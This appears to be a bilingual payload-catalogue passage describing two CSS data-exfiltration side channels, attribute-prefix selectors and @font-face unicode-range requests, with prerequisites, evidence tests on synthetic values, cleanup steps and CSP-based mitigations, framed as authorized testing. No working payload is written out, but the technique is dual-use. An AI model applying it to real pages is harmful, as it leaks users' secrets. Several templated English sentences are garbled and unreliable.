prerequisites.en: Each event runs in an independent fixture and calls only a one-time marker, resources are locally controlled, and event listeners, readyState, and call stacks are recorded.

analysis.zh: 阳性证据是目标元素在对应浏览器中因预期加载/状态事件调用注入的处理器并执行 marker，事件目标与资源状态一致。 假阳性边界：事件属性保留但浏览器不支持、资源未触发该事件、marker 来自父页面 onload、手工 focus/click 或旧浏览器文档描述都不成立。
analysis.en: Positive evidence requires the target element in the matching browser to call the injected handler on the expected load or state event and execute the marker, with event target and resource state aligned. False-positive boundary: A retained event attribute with unsupported browser behavior, a resource that never triggers the event, a marker from the parent onload, manual focus or click, or old documentation does not qualify.

opsecTips.zh: 低频事件验证限制单元素单事件；出现持续 marquee/media、插件提示、焦点劫持、下载、弹窗循环或外连时停止。
opsecTips.en: Less-common event validation uses one element and event per run; stop on persistent marquee or media, plugin prompts, focus hijacking, downloads, popup loops, or egress.

opsecTips.zh: 移除元素、事件属性和本地资源，停止媒体/动画，清理事件日志与 browser profile，并重载确认无遗留焦点或加载任务。
opsecTips.en: Remove elements, event attributes, and local resources, stop media and animations, clear event logs and browser profiles, and reload to confirm no residual focus or load task.

name.zh: CSS 属性选择器逐字符外带

description.zh: 按 input[value^=] 前缀规则触发不同 URL 请求，验证攻击者可控样式能否逐字符推断 DOM 属性中的预置测试值。
description.en: Uses input[value^=] prefix rules with distinct request URLs to test whether attacker-controlled styles can infer a planted DOM attribute one character at a time.

overview.zh: CSS 属性选择器逐字符外带属于 CSS 条件资源加载侧信道。验证目标为：属性前缀选择器是否能根据隐藏或可见 input 的 value 属性选择性加载背景资源并泄露字符匹配结果。该测试要求：不可信样式能作用于含敏感 value 属性的同一文档，浏览器允许选择器匹配该属性，并能向测试域发出图片请求。有效证据标准为：一次实验只放置一个已知哨兵值，收到的字符 URL 必须与其首字符一致；静态页面缓存和预取需要先排除。无条件字体、图片或样式请求只能证明存在外连，不能证明敏感值已被推断。
overview.en: CSS Attribute Selector Character Exfiltration checks whether attribute-prefix selectors conditionally load background resources based on a hidden or visible input value and reveal character matches. It applies when untrusted styles apply to the same document as a sensitive value attribute, the browser permits matching that attribute, and image requests can reach the test origin. A conclusion requires each experiment uses one known sentinel value and the requested character URL must match its first character, after excluding page cache and prefetch behavior; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 侧信道成立的前提为：不可信样式能作用于含敏感 value 属性的同一文档，浏览器允许选择器匹配该属性，并能向测试域发出图片请求。审计围绕“属性前缀选择器是否能根据隐藏或可见 input 的 value 属性选择性加载背景资源并泄露字符匹配结果”使用预置的非敏感哨兵值，并严格控制缓存、预加载和字体回退。否则，网络请求与字符或属性条件之间无法建立可靠因果关系。
vulnerability.en: The risk exists when untrusted styles apply to the same document as a sensitive value attribute, the browser permits matching that attribute, and image requests can reach the test origin, allowing whether attribute-prefix selectors conditionally load background resources based on a hidden or visible input value and reveal character matches. Review the input source, final parsing context, browser or policy version, and each experiment uses one known sentinel value and the requested character URL must match its first character, after excluding page cache and prefetch behavior; otherwise record only an unconfirmed control differential.

exploitation.zh: 以随机非敏感字符串设置测试 input value，清理缓存后加载原选择器集合，核对唯一命中的前缀请求；不要针对真实密码或令牌字段。先建立无条件资源加载基线，再逐个启用字符或属性条件；每轮清理缓存并记录 Initiator、请求 URL 与已知哨兵值，最终按“一次实验只放置一个已知哨兵值，收到的字符 URL 必须与其首字符一致；静态页面缓存和预取需要先排除”判断条件侧信道是否可重复。
exploitation.en: In an authorized isolated environment, set a random non-sensitive test input value, clear caches, load the original selector set, and verify the single matching prefix request without targeting real password or token fields. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 禁止用户样式进入受信页面，消毒 style 与选择器；敏感值不要写入可匹配 DOM 属性，并用 CSP img-src/style-src 和网络出口限制远程请求。回归分别覆盖合法主题样式、受控字体和原条件规则，确认业务样式仍可加载，而用户样式无法接触敏感 DOM，也不能向非允许域发送选择性请求。
mitigation.en: Remediation should keep user styles out of trusted pages, sanitize style content and selectors, avoid placing secrets in matchable DOM attributes, and restrict remote requests with CSP img-src, style-src, and network egress policy. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 界定“CSS 属性选择器逐字符外带”可控样式范围
title.en: Scope the CSS Attribute Selector Character Exfiltration data flow

description.zh: 确认前提“不可信样式能作用于含敏感 value 属性的同一文档，浏览器允许选择器匹配该属性，并能向测试域发出图片请求”，记录样式作用域、敏感 DOM 隔离、CSP 资源指令和缓存状态。
description.en: Trace the real input to the final sink or policy decision, confirm that untrusted styles apply to the same document as a sensitive value attribute, the browser permits matching that attribute, and image requests can reach the test origin, and record browser, response-header, and relevant component versions.

title.zh: 建立“CSS 选择器侧信道”外连基线
title.en: Establish the CSS Selector Side Channel baseline

description.zh: 先用无条件测试资源确认网络可观察性，再放置已知哨兵值，并按“一次实验只放置一个已知哨兵值，收到的字符 URL 必须与其首字符一致；静态页面缓存和预取需要先排除”判断条件命中。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only each experiment uses one known sentinel value and the requested character URL must match its first character, after excluding page cache and prefetch behavior as valid evidence.

title.zh: 逐条件重放“CSS 属性选择器逐字符外带”
title.en: Run a single-variable CSS Attribute Selector Character Exfiltration check

description.zh: 以随机非敏感字符串设置测试 input value，清理缓存后加载原选择器集合，核对唯一命中的前缀请求；不要针对真实密码或令牌字段；每轮清理缓存并只启用一个字符或属性条件，不接触真实用户数据。
description.en: set a random non-sensitive test input value, clear caches, load the original selector set, and verify the single matching prefix request without targeting real password or token fields; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 阻断样式外带并复测
title.en: Retest the CSS Attribute Selector Character Exfiltration remediation boundary

description.zh: 禁止用户样式进入受信页面，消毒 style 与选择器；敏感值不要写入可匹配 DOM 属性，并用 CSP img-src/style-src 和网络出口限制远程请求；验证合法主题仍可用，同时条件选择器或字体规则无法向非允许域发送请求。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while each experiment uses one known sentinel value and the requested character URL must match its first character, after excluding page cache and prefetch behavior no longer appears.

review.rationale: CSS 属性选择器逐字符外带保留为 Payload，用于审查“属性前缀选择器是否能根据隐藏或可见 input 的 value 属性选择性加载背景资源并泄露字符匹配结果”。成立时必须满足证据要求“一次实验只放置一个已知哨兵值，收到的字符 URL 必须与其首字符一致；静态页面缓存和预取需要先排除”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 攻击者样式能应用到含合成 input[value] 的 DOM，目标浏览器允许属性前缀选择器和 background URL 请求。
prerequisites.en: Attacker CSS can apply to DOM containing a synthetic input value, and the target browser permits attribute-prefix selectors and background URL requests.

prerequisites.zh: 每个候选字符使用自有唯一令牌，测试值、错误前缀、空值和无样式基线均已准备，并禁用共享缓存。
prerequisites.en: Each candidate character uses an owned unique token, with target value, wrong-prefix, empty-value, and no-style baselines prepared and shared caches disabled.

analysis.zh: 阳性证据是仅匹配当前合成前缀的 CSS 规则产生对应 URL 请求，错误前缀不请求，并可在重复测试中逐字符稳定区分。 假阳性边界：所有字符 URL 都被预取、缓存命中、代理/扫描器请求、页面已有 background 或请求无法绑定到具体选择器时均不是侧信道。
analysis.en: Positive evidence requires only the CSS rule matching the current synthetic prefix to emit its URL request, with wrong prefixes silent and repeatable character-by-character discrimination. False-positive boundary: Prefetching all character URLs, cache hits, proxy or scanner requests, existing page backgrounds, or traffic not attributable to a specific selector is not a side channel.

opsecTips.zh: CSS 逐字符测试只使用短合成值和有限字母表，禁止尝试真实密码/token；请求数量异常、真实字段匹配或第三方流量时停止。
opsecTips.en: CSS character testing uses a short synthetic value and limited alphabet and never targets real passwords or tokens; stop on abnormal request volume, real-field matching, or third-party traffic.

opsecTips.zh: 删除全部前缀规则和合成 input，清理样式/浏览器/CDN 缓存，停用字符监听路径并删除令牌映射。
opsecTips.en: Delete all prefix rules and the synthetic input, clear style, browser, and CDN caches, disable character-listener paths, and delete token mappings.

name.zh: CSS @font-face Unicode 范围外带

description.zh: 利用 @font-face 的 unicode-range 为不同字符配置独立字体 URL，验证页面渲染字符是否可通过条件字体请求被推断。
description.en: Assigns distinct font URLs to character-specific unicode-range descriptors to test whether rendered characters can be inferred from conditional font requests.

overview.zh: CSS @font-face Unicode 范围外带属于 CSS 条件资源加载侧信道。验证目标为：浏览器是否只在页面实际使用某个 Unicode 码位时请求对应字体资源，从而向外部观察者暴露字符集合。该测试要求：攻击者能够注入 @font-face 并将自定义字体应用到目标文本，CSP 允许外部 font-src，且敏感字符真实参与布局和字体选择。有效证据标准为：使用已知哨兵文本时仅收到对应 unicode-range 的字体请求，并在清缓存和禁用预加载后仍可重复，才证明条件侧信道。无条件字体、图片或样式请求只能证明存在外连，不能证明敏感值已被推断。
overview.en: CSS Font-Face Unicode-Range Exfiltration checks whether the browser requests a font resource only when the page uses a corresponding Unicode code point, exposing the rendered character set to an external observer. It applies when an attacker can inject font-face rules and apply the custom font to target text, CSP permits external font-src, and the sensitive character participates in layout and font selection. A conclusion requires only font requests matching known sentinel text, reproducible after cache clearing and with preload disabled, prove the conditional side channel; reflected text, simple network acceptance, or a browser compatibility difference alone is not proof.

vulnerability.zh: 侧信道成立的前提为：攻击者能够注入 @font-face 并将自定义字体应用到目标文本，CSP 允许外部 font-src，且敏感字符真实参与布局和字体选择。审计围绕“浏览器是否只在页面实际使用某个 Unicode 码位时请求对应字体资源，从而向外部观察者暴露字符集合”使用预置的非敏感哨兵值，并严格控制缓存、预加载和字体回退。否则，网络请求与字符或属性条件之间无法建立可靠因果关系。
vulnerability.en: The risk exists when an attacker can inject font-face rules and apply the custom font to target text, CSP permits external font-src, and the sensitive character participates in layout and font selection, allowing whether the browser requests a font resource only when the page uses a corresponding Unicode code point, exposing the rendered character set to an external observer. Review the input source, final parsing context, browser or policy version, and only font requests matching known sentinel text, reproducible after cache clearing and with preload disabled, prove the conditional side channel; otherwise record only an unconfirmed control differential.

exploitation.zh: 在隔离页渲染固定的 A、B、C 与数字哨兵文本，加载原 @font-face 集合并记录字体网络请求；比较未应用自定义字体的对照页面。先建立无条件资源加载基线，再逐个启用字符或属性条件；每轮清理缓存并记录 Initiator、请求 URL 与已知哨兵值，最终按“使用已知哨兵文本时仅收到对应 unicode-range 的字体请求，并在清缓存和禁用预加载后仍可重复，才证明条件侧信道”判断条件侧信道是否可重复。
exploitation.en: In an authorized isolated environment, render fixed A, B, C, and numeric sentinel text in an isolated page, load the original font-face set, record font requests, and compare against a control page without the custom font. Replay the original command set with one-time harmless markers, change one encoding, element, event, or policy variable at a time, and retain request, final DOM, console, network, and server evidence to exclude cache, prefetch, and manual-interaction false positives.

mitigation.zh: 禁止不可信 @font-face 和任意字体 URL，收紧 CSP font-src/style-src，敏感文本使用隔离渲染且不允许用户样式作用于同一 DOM。回归分别覆盖合法主题样式、受控字体和原条件规则，确认业务样式仍可加载，而用户样式无法接触敏感 DOM，也不能向非允许域发送选择性请求。
mitigation.en: Remediation should disallow untrusted font-face rules and arbitrary font URLs, tighten CSP font-src and style-src, and render sensitive text in an isolated context not reachable by user styles. Retest the normal baseline and minimized abnormal case in the same browser, policy, and input location to confirm required rendering, navigation, or resource loading remains available while execution, conditional requests, or object override evidence disappears.

title.zh: 界定“CSS @font-face Unicode 范围外带”可控样式范围
title.en: Scope the CSS Font-Face Unicode-Range Exfiltration data flow

description.zh: 确认前提“攻击者能够注入 @font-face 并将自定义字体应用到目标文本，CSP 允许外部 font-src，且敏感字符真实参与布局和字体选择”，记录样式作用域、敏感 DOM 隔离、CSP 资源指令和缓存状态。
description.en: Trace the real input to the final sink or policy decision, confirm that an attacker can inject font-face rules and apply the custom font to target text, CSP permits external font-src, and the sensitive character participates in layout and font selection, and record browser, response-header, and relevant component versions.

title.zh: 建立“CSS 字体加载侧信道”外连基线
title.en: Establish the CSS Font Loading Side Channel baseline

description.zh: 先用无条件测试资源确认网络可观察性，再放置已知哨兵值，并按“使用已知哨兵文本时仅收到对应 unicode-range 的字体请求，并在清缓存和禁用预加载后仍可重复，才证明条件侧信道”判断条件命中。
description.en: Use a unique inert marker to establish response, DOM, network, and log baselines, accepting only only font requests matching known sentinel text, reproducible after cache clearing and with preload disabled, prove the conditional side channel as valid evidence.

title.zh: 逐条件重放“CSS @font-face Unicode 范围外带”
title.en: Run a single-variable CSS Font-Face Unicode-Range Exfiltration check

description.zh: 在隔离页渲染固定的 A、B、C 与数字哨兵文本，加载原 @font-face 集合并记录字体网络请求；比较未应用自定义字体的对照页面；每轮清理缓存并只启用一个字符或属性条件，不接触真实用户数据。
description.en: render fixed A, B, C, and numeric sentinel text in an isolated page, load the original font-face set, record font requests, and compare against a control page without the custom font; minimize the original set one entry at a time and replace every callback or external destination with an isolated test endpoint.

title.zh: 阻断样式外带并复测
title.en: Retest the CSS Font-Face Unicode-Range Exfiltration remediation boundary

description.zh: 禁止不可信 @font-face 和任意字体 URL，收紧 CSP font-src/style-src，敏感文本使用隔离渲染且不允许用户样式作用于同一 DOM；验证合法主题仍可用，同时条件选择器或字体规则无法向非允许域发送请求。
description.en: After applying the documented remediation, replay normal and abnormal baselines and confirm required behavior remains while only font requests matching known sentinel text, reproducible after cache clearing and with preload disabled, prove the conditional side channel no longer appears.

review.rationale: CSS @font-face Unicode 范围外带保留为 Payload，用于审查“浏览器是否只在页面实际使用某个 Unicode 码位时请求对应字体资源，从而向外部观察者暴露字符集合”。成立时必须满足证据要求“使用已知哨兵文本时仅收到对应 unicode-range 的字体请求，并在清缓存和禁用预加载后仍可重复，才证明条件侧信道”，而不是仅依据字符串回显、WAF 放行或普通网络请求。

prerequisites.zh: 攻击者可注入 @font-face，目标文本包含合成测试字符，浏览器按 unicode-range 选择远程字体且字体加载未被 CSP 阻断。
prerequisites.en: An attacker can inject @font-face, target text contains synthetic test characters, and the browser selects remote fonts by unicode-range without CSP blocking font loads.

prerequisites.zh: 每个字符范围对应自有最小字体 URL 和唯一令牌，配置不含字符、错误范围、本地字体和禁用缓存的负对照。
prerequisites.en: Each character range maps to an owned minimal-font URL and unique token, with absent-character, wrong-range, local-font, and cache-disabled negative controls.

analysis.zh: 阳性证据是渲染特定合成字符时只请求覆盖其 unicode-range 的字体令牌，字符移除或范围改变后请求消失，且事件来自目标浏览器。 假阳性边界：浏览器预加载全部字体、fallback 或缓存请求、安全扫描器抓取 CSS、字体 404 重试或请求与页面字符无条件相关均不能证明泄露。
analysis.en: Positive evidence requires rendering a synthetic character to request only the font token covering its unicode-range, with the request disappearing when the character or range changes and originating from the target browser. False-positive boundary: Browser preloading of all fonts, fallback or cached requests, scanner CSS fetches, font 404 retries, or requests unrelated to page characters does not prove leakage.

opsecTips.zh: unicode-range 测试只使用少量合成字符和最小字体，禁止扫描真实页面秘密；出现字体请求风暴、公共源访问或性能下降时停止。
opsecTips.en: Unicode-range testing uses a few synthetic characters and minimal fonts only and never scans real page secrets; stop on font-request storms, public-origin access, or performance degradation.

opsecTips.zh: 移除 @font-face 和合成文本，清理字体/CSS/浏览器缓存，关闭字体端点并删除请求令牌与临时字体文件。
opsecTips.en: Remove @font-face rules and synthetic text, clear font, CSS, and browser caches, close font endpoints, and delete request tokens and temporary font files.
